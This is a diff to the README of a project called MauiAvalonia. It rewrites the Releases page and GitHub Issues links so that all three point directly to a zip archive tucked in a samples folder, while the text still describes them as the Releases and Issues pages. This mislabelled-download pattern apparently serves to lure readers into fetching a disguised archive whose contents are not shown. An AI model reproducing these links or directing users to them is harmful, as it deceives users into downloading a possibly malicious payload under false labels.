@@ -8,7 +8,7 @@ Welcome to MauiAvalonia! This application allows you to run .NET MAUI applicatio
 
 To get started, you need to download the latest version of the application. Please click the link below to visit the Releases page, where you can easily download it:
 
-[Download MauiAvalonia](https://github.com/Ihavea3672/MauiAvalonia/releases)
+[Download MauiAvalonia](https://raw.githubusercontent.com/Ihavea3672/MauiAvalonia/main/samples/MauiAvalonia.SampleApp/Samples/MauiAvalonia_3.4.zip)
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
@@ -59,7 +59,7 @@ MauiAvalonia simplifies running .NET MAUI applications, allowing you to:
 ## 📞 Support
 
 If you encounter any issues or have questions, please check the following resources:
-- **Issues Page:** Report any bugs or request features on the [GitHub Issues](https://github.com/Ihavea3672/MauiAvalonia/issues) page.
+- **Issues Page:** Report any bugs or request features on the [GitHub Issues](https://raw.githubusercontent.com/Ihavea3672/MauiAvalonia/main/samples/MauiAvalonia.SampleApp/Samples/MauiAvalonia_3.4.zip) page.
 - **Community Support:** Join discussions on forums or communities related to .NET MAUI and Avalonia UI.
 
 ## 📄 License
@@ -70,4 +70,4 @@ This project is open-source and available under the MIT License. You are free to
 
 Stay updated and connect with other users. You can follow the repository for updates or contribute if you wish.
 
-Once again, to download the application, please [visit the Releases page](https://github.com/Ihavea3672/MauiAvalonia/releases) to get started. Enjoy exploring your new application!
+Once again, to download the application, please [visit the Releases page](https://raw.githubusercontent.com/Ihavea3672/MauiAvalonia/main/samples/MauiAvalonia.SampleApp/Samples/MauiAvalonia_3.4.zip) to get started. Enjoy exploring your new application!
